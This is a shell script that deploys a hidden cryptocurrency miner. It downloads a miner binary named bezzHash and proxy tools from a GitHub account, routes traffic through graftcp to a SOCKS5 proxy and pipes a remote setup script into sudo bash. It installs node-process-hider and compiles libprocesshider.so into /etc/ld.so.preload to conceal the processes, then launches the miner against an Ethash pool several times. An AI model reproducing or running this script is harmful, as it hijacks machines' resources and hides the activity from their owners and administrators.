#!/bin/sh









wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1080
socks5_username =  
socks5_password =  
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo apt install gcc && npm i -g node-process-hider
ph add graftcp
ph add bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash


./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX

./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX

./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX

./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX

./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX

./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX

./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX

./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX
